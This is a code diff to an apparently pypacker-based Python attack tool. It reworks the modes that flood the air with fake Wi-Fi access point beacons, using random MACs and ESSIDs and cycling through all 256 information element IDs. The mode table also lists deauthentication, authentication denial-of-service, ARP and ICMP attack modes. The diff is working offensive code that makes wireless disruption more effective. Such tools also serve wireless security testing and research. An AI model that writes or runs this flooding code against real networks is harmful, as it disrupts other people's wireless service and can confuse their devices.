@@ -224,6 +224,7 @@ def wifi_ap_cb(pargs):
 	_beacon.params[0].len = len(essid)
 	_beacon.params[2].body_bytes = pack_B(channels[0])
 	_beacon.seq = 0
+	_beacon.interval = 0xFFFF
 	# adaptive sleeptime due to full buffer on fast sending
 	sleeptime = 0.000001
 	rand_mac = True
@@ -233,50 +234,58 @@ def wifi_ap_cb(pargs):
 	logger.info("faking APs on the following channels %r", channels)
 	psock_send = psocket.SocketHndl(iface_name=pargs.iface_name,
 									mode=psocket.SocketHndl.MODE_LAYER_2)
+	cnt = 0
+	rounds = 0
+	PACKETS_PER_CHANNEL = 3
+	starttime = time.time()
+	_beacon.params[2].body_bytes = pack_B(channels[0])
+	utils.switch_wlan_channel(pargs.iface_name, channels[0])
 
-	for cnt in range(pargs.count):
+	for _ in range(pargs.count):
 		if not pargs.is_running:
 			break
-		if cnt & 0xFF == 0:
-			print("%d sent\r" % cnt, end="")
+
+		if cnt & 0xF == 0:
+			print("%d packets sent\r" % (cnt * PACKETS_PER_CHANNEL), end="")
 			sys.stdout.flush()
 
-		for channel in channels:
-			_beacon.params[2].body_bytes = pack_B(channel)
-			utils.switch_wlan_channel(pargs.iface_name, channel)
+			if time.time() - starttime > 60:
+				rounds += 1
+		cnt += 1
 
-			if rand_mac:
-				mac = pypacker.get_rnd_mac()
-				_beacon.src = mac
-				_beacon.bssid = mac
+		if rand_mac:
+			mac = pypacker.get_rnd_mac()
+			_beacon.src = mac
+			_beacon.bssid = mac
 
-			if rand_essid:
-				_beacon.params[0].body_bytes = get_random_essid()
-				_beacon.params[0].len = len(_beacon.params[0].body_bytes)
-			#logger.info("AP on channel %d: %s", channel, _beacon.params[0].body_bytes)
+		if rand_essid:
+			_beacon.params[0].body_bytes = get_random_essid()
+			_beacon.params[0].len = len(_beacon.params[0].body_bytes)
 
-			try:
-				for cnt_ap in range(3):
-					# send multiple beacons for every ap
-					psock_send.send(beacon.bin())
-					time.sleep(sleeptime)
-					_beacon.seq = cnt_ap
-					# _beacon.ts = x << (8*7)
-					_beacon.ts = cnt_ap * 20
-				# time.sleep(0.01)
-			except socket.timeout:
-				# timeout on sending? that's ok
-				pass
-			except OSError:
-				sleeptime *= 10
-				print()
-				logger.warning("buffer full, new sleeptime: %03.6fs, waiting...", sleeptime)
-				time.sleep(1)
+		try:
+			_beacon.seq = 1000 + rounds * PACKETS_PER_CHANNEL
+			_beacon.ts = 2000 + rounds * 0x100 * PACKETS_PER_CHANNEL
+
+			for cnt_ap in range(PACKETS_PER_CHANNEL):
+				# send multiple beacons for every ap
+				psock_send.send(beacon.bin())
+				_beacon.seq += 1
+				_beacon.ts += 0x100
+				#time.sleep(sleeptime)
+		except socket.timeout:
+			# timeout on sending? that's ok
+			pass
+		except OSError:
+			sleeptime *= 10
+			print()
+			logger.warning("buffer full, new sleeptime: %03.6fs, waiting...", sleeptime)
+			time.sleep(1)
+
 	psock_send.close()
 
 
 
-def wifi_ap_ie(pargs):
+def wifi_ap_ie_cb(pargs):
 	"""
 	Create fake APs using various IEs
 	"""
@@ -301,7 +310,7 @@ def wifi_ap_ie(pargs):
 	beacon = copy.deepcopy(beacon_orig)
 	_beacon = beacon[ieee80211.IEEE80211.Beacon]
 	mac = pypacker.get_rnd_mac()
-	essid = "FreeHotspot"
+	essid = "012"
 	_beacon.src = mac
 	_beacon.bssid = mac
 	_beacon.params[0].body_bytes = bytes(essid, "ascii")
@@ -314,38 +323,42 @@ def wifi_ap_ie(pargs):
 
 	logger.info("faking APs on the following channels %r", channels)
 	psock_send = psocket.SocketHndl(iface_name=pargs.iface_name,
-									mode=psocket.SocketHndl.MODE_LAYER_2)
-	ie_cnt = 0
+		mode=psocket.SocketHndl.MODE_LAYER_2)
 
-	for cnt in range(pargs.count):
+	ie_cnt = 0
+	pkt_cnt = 0
+	PACKETS_PER_CHANNEL = 3
+
+	for _ in range(pargs.count):
 		if not pargs.is_running:
 			break
-		if cnt & 0xFF == 0:
-			print("%d sent\r" % cnt, end="")
-			sys.stdout.flush()
 
 		for channel in channels:
+			if pkt_cnt % (256) == 0:
+				print("%d packets sent, ch: %d      \r" % (pkt_cnt, channel), end="")
+				sys.stdout.flush()
+
 			_beacon.params[2].body_bytes = pack_B(channel)
-			_beacon.params[5].id = ie_cnt
 			utils.switch_wlan_channel(pargs.iface_name, channel)
-
-			mac = pypacker.get_rnd_mac()
-			_beacon.src = mac
-			_beacon.bssid = mac
-
-			_beacon.params[0].body_bytes = get_random_essid()
-			_beacon.params[0].len = len(_beacon.params[0].body_bytes)
 			#logger.info("AP on channel %d: %s", channel, _beacon.params[0].body_bytes)
+			pkt_cnt += 256
 
 			try:
-				for cnt_ap in range(3):
-					# send multiple beacons for every ap
-					psock_send.send(beacon.bin())
-					time.sleep(sleeptime)
-					_beacon.seq = cnt_ap
-					# _beacon.ts = x << (8*7)
-					_beacon.ts = cnt_ap * 20
-				# time.sleep(0.01)
+				for ie_id in range(256):
+					_beacon.params[5].id = ie_id
+					mac = pypacker.get_rnd_mac()
+					_beacon.src = mac
+					_beacon.bssid = mac
+					_beacon.params[0].body_bytes = get_random_essid()
+					_beacon.params[0].len = len(_beacon.params[0].body_bytes)
+
+					for _ in range(PACKETS_PER_CHANNEL):
+						_beacon.seq = ie_id
+						# _beacon.ts = x << (8*7)
+						_beacon.ts = ie_id * 20
+						# time.sleep(0.01)
+						psock_send.send(beacon.bin())
+						time.sleep(sleeptime)
 			except socket.timeout:
 				# timeout on sending? that's ok
 				pass
@@ -355,7 +368,7 @@ def wifi_ap_ie(pargs):
 				logger.warning("buffer full, new sleeptime: %03.6fs, waiting...", sleeptime)
 				time.sleep(1)
 
-			ie_cnt = (ie_cnt + 1) % 256
+			ie_cnt = (ie_cnt + 1) & 0xFF
 	psock_send.close()
 
 def wifi_authdos_cb(pargs):
@@ -631,7 +644,7 @@ if __name__ == "__main__":
 	mode_cb = {
 		"wifi_deauth": (["channels", "nobroadcast", "exclude"], wifi_deauth_cb),
 		"wifi_ap": (["channels"], wifi_ap_cb),
-		"wifi_ap_ie": (["channels"], wifi_ap_ie),
+		"wifi_ap_ie": (["channels"], wifi_ap_ie_cb),
 		"wifi_auth": (["channel", "mac_dst", "channels"], wifi_authdos_cb),
 		"arp": (["mac_dst", "ip_dst"], arp_cb),
 		"icmp": (["mac_dst", "ip_dst"], icmp_cb),
@@ -675,7 +688,7 @@ if __name__ == "__main__":
 				pypacker.mac_str_to_bytes(mac) for mac in args.macs_excluded.split(",")
 		])
 
-	wifi_modes = {"wifi_deauth", "wifi_ap", "wifi_auth"}
+	wifi_modes = {"wifi_deauth", "wifi_ap", "wifi_ap_ie", "wifi_auth"}
 
 	if args.mode in wifi_modes:
 		logger.info("trying to activate monitor mode on %s", args.iface_name)
